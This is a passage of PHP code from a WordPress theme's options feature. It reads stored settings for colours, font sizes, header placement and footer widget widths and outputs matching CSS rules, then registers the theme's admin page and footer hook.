        if($value['id'] == "lcmp_csttitlecolor"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_csttitlecolor = "";
           }else{
                $lcmp_csttitlecolor  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstslogancolor"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstslogancolor = "";
           }else{
                $lcmp_cstslogancolor  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_titlefontsize"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_titlefontsize = "default";
           }else{
                $lcmp_titlefontsize  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_sloganfontsize"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_sloganfontsize = "default";
           }else{
                $lcmp_sloganfontsize  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_csttitlefontsize"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_csttitlefontsize = "";
           }else{
                $lcmp_csttitlefontsize  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstsloganfontsize"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstsloganfontsize = "";
           }else{
                $lcmp_cstsloganfontsize  = get_settings( $value['id'] );
           }
        }

        if($value['id'] == "lcmp_hdrleftpos"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_hdrleftpos = "default";
           }else{
                $lcmp_hdrleftpos  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_hdrtoppos"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_hdrtoppos = "default";
           }else{
                $lcmp_hdrtoppos  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_hdrwidth"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_hdrwidth = "default";
           }else{
                $lcmp_hdrwidth  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_hdrvmargin"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_hdrvmargin = "default";
           }else{
                $lcmp_hdrvmargin  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_contentfontsize"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_contentfontsize = "default";
           }else{
                $lcmp_contentfontsize  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstcontentfontsize"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstcontentfontsize = "";
           }else{
                $lcmp_cstcontentfontsize  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_sidebarloc"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_sidebarloc = "default";
           }else{
                $lcmp_sidebarloc = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_sidebarfontsize"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_sidebarfontsize = "default";
           }else{
                $lcmp_sidebarfontsize  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstsidebarfontsize"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstsidebarfontsize = "";
           }else{
                $lcmp_cstsidebarfontsize  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstftrwidgewidth"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstftrwidgewidth = "";
           }else{
                $lcmp_cstftrwidgewidth  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstftrwidgewidth1"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstftrwidgewidth1 = "";
           }else{
                $lcmp_cstftrwidgewidth1  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstftrwidgewidth2"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstftrwidgewidth2 = "";
           }else{
                $lcmp_cstftrwidgewidth2  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstftrwidgewidth3"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstftrwidgewidth3 = "";
           }else{
                $lcmp_cstftrwidgewidth3  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstftrwidgewidth4"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstftrwidgewidth4 = "";
           }else{
                $lcmp_cstftrwidgewidth4  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstftrwidgemargin"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstftrwidgemargin = "";
           }else{
                $lcmp_cstftrwidgemargin  = get_settings( $value['id'] );
           }
        }
    }	    

if($lcmp_contentlnk!='default'){
    if($lcmp_contentlnk=='custom'){
        $lcmp_contentlnk_color = "color:".$lcmp_cstcontentlnk;
    }else $lcmp_contentlnk_color = "color:".$lcmp_contentlnk;
?>
a,a:link,a:visited,a.visited,a:hover,a.hover
{text-decoration: underline;<?php echo $lcmp_contentlnk_color; ?>;}
a:hover, a.hover{text-decoration: none;}
<?php } ?>
<?php
if($lcmp_sidebarlnk!='default'){
    if($lcmp_sidebarlnk=='custom'){
        $lcmp_sidebarlnk_color = "color:".$lcmp_cstsidebarlnk;
    }else $lcmp_sidebarlnk_color = "color:".$lcmp_sidebarlnk;
?>
.BlockContent-body a,.BlockContent-body a:link,.BlockContent-body a:visited,.BlockContent-body a.visited,.BlockContent-body a:hover,.BlockContent-body a.hover
{text-decoration: underline;<?php echo $lcmp_sidebarlnk_color; ?>;}
.BlockContent-body a:hover,.BlockContent-body a.hover
{text-decoration: none;}
<?php } ?>
<?php 
if($lcmp_sidebarfontsize!='default'){
    if($lcmp_sidebarfontsize=='custom'){
        if(is_numeric($lcmp_cstsidebarfontsize)) $lcmp_cstsidebarfontsize.="px";
        $lcmp_sidebarfontsize_size = "font-size:$lcmp_cstsidebarfontsize";
    }else $lcmp_sidebarfontsize_size = "font-size:$lcmp_sidebarfontsize";
?>
.BlockContent-body,.BlockContent-body li
{<?php echo $lcmp_sidebarfontsize_size; ?>;}
<?php } ?>   
<?php 
if($lcmp_contentfontsize!='default'){
    if($lcmp_contentfontsize=='custom'){
        if(is_numeric($lcmp_cstcontentfontsize)) $lcmp_cstcontentfontsize.="px";
        $lcmp_contentfontsize_size = "font-size:$lcmp_cstcontentfontsize";
    }else $lcmp_contentfontsize_size = "font-size:$lcmp_contentfontsize";
?>
.PostContent
{<?php echo $lcmp_contentfontsize_size; ?>;}
<?php } ?> 
h1.logo-name, h1.logo-name a, h1.logo-name a:link, h1.logo-name a:visited, h1.logo-name a:hover{
<?php
if($lcmp_titlecolor!='default'){
    if($lcmp_titlecolor=='custom'){
        $lcmp_titlecolor_color = "color:$lcmp_csttitlecolor !important";
    }else $lcmp_titlecolor_color = "color:$lcmp_titlecolor !important";
?>
<?php echo $lcmp_titlecolor_color; ?>;
<?php } ?>
<?php
if($lcmp_hdrtxtalign!='default'){
    $lcmp_hdrtxtalign_text = "text-align:$lcmp_hdrtxtalign";
?>
<?php echo $lcmp_hdrtxtalign_text; ?>;
<?php } ?>
<?php
if($lcmp_titlefontsize!='default'){
    if($lcmp_titlefontsize=='custom'){
        if(is_numeric($lcmp_csttitlefontsize)) $lcmp_csttitlefontsize.="px";
        $lcmp_titlefontsize_size = "font-size:$lcmp_csttitlefontsize";
    }else $lcmp_titlefontsize_size = "font-size:$lcmp_titlefontsize";
?>
<?php echo $lcmp_titlefontsize_size; ?>;
<?php } ?>}
.logo-text, .logo-text a{
<?php 
if($lcmp_slogancolor!='default'){
    if($lcmp_slogancolor=='custom'){
        $lcmp_slogancolor_color = "color:$lcmp_cstslogancolor !important";
    }else $lcmp_slogancolor_color = "color:$lcmp_slogancolor !important";
?>
<?php echo $lcmp_slogancolor_color; ?>;
<?php } ?>
<?php
if($lcmp_hdrtxtalign!='default'){
    $lcmp_hdrtxtalign_text = "text-align:$lcmp_hdrtxtalign";
?>
<?php echo $lcmp_hdrtxtalign_text; ?>;
<?php } ?>
<?php 
if($lcmp_sloganfontsize!='default'){
    if($lcmp_sloganfontsize=='custom'){
        if(is_numeric($lcmp_cstsloganfontsize)) $lcmp_cstsloganfontsize.="px";
        $lcmp_sloganfontsize_size = "font-size:$lcmp_cstsloganfontsize";
    }else $lcmp_sloganfontsize_size = "font-size:$lcmp_sloganfontsize";
?>
<?php echo $lcmp_sloganfontsize_size; ?>;
<?php } ?>}
.logo{
<?php 
if($lcmp_hdrleftpos!='default'){
    if(is_numeric($lcmp_hdrleftpos)) $lcmp_hdrleftpos.="px";
?>
left: <?php echo $lcmp_hdrleftpos; ?>;
<?php } ?>
<?php 
if($lcmp_hdrtoppos!='default'){
    if(is_numeric($lcmp_hdrtoppos)) $lcmp_hdrtoppos.="px";
?>
top:<?php echo $lcmp_hdrtoppos; ?>;
<?php } ?>
<?php 
if($lcmp_hdrwidth!='default'){
    if(is_numeric($lcmp_hdrwidth)) $lcmp_hdrwidth.="px";
?>
width: <?php echo $lcmp_hdrwidth; ?>;
<?php } ?>}
<?php 
if($lcmp_hdrvmargin!='default'){
    if(is_numeric($lcmp_hdrvmargin)) $lcmp_hdrvmargin.="px";
?>
.Sheet
{margin-top: <?php echo $lcmp_hdrvmargin; ?> !important;}
<?php } ?>

<?php 
if($lcmp_cstftrwidgewidth!='' || $lcmp_cstftrwidgemargin!=''){
?>
.widget-area{
<?php
if($lcmp_cstftrwidgewidth!=''){
    if(is_numeric($lcmp_cstftrwidgewidth)) $lcmp_cstftrwidgewidth.="px";
?>
width: <?php echo $lcmp_cstftrwidgewidth; ?>;
<?php } ?>
<?php
if($lcmp_cstftrwidgemargin!=''){
    if(is_numeric($lcmp_cstftrwidgemargin)) $lcmp_cstftrwidgemargin.="px";
?>
margin-right: <?php echo $lcmp_cstftrwidgemargin; ?>;
<?php } ?>
}
<?php 
} ?>

<?php 
if($lcmp_cstftrwidgewidth1!=''){
    if(is_numeric($lcmp_cstftrwidgewidth1)) $lcmp_cstftrwidgewidth1.="px";
?>
.foot-widget-1
{width: <?php echo $lcmp_cstftrwidgewidth1; ?>;}
<?php } ?>

<?php 
if($lcmp_cstftrwidgewidth2!=''){
    if(is_numeric($lcmp_cstftrwidgewidth2)) $lcmp_cstftrwidgewidth2.="px";
?>
.foot-widget-2
{width: <?php echo $lcmp_cstftrwidgewidth2; ?>;}
<?php } ?>

<?php 
if($lcmp_cstftrwidgewidth3!=''){
    if(is_numeric($lcmp_cstftrwidgewidth3)) $lcmp_cstftrwidgewidth3.="px";
?>
.foot-widget-3
{width: <?php echo $lcmp_cstftrwidgewidth3; ?>;}
<?php } ?>

<?php 
if($lcmp_cstftrwidgewidth4!=''){
    if(is_numeric($lcmp_cstftrwidgewidth4)) $lcmp_cstftrwidgewidth4.="px";
?>
.foot-widget-4
{width: <?php echo $lcmp_cstftrwidgewidth4; ?>;}
<?php } ?>


</style>
<?php
}
global $adsenseBlock1;
TXT;

add_action('admin_menu', 'lcmp_add_theme_page');
add_action('wp_footer','lcmp_theme_options');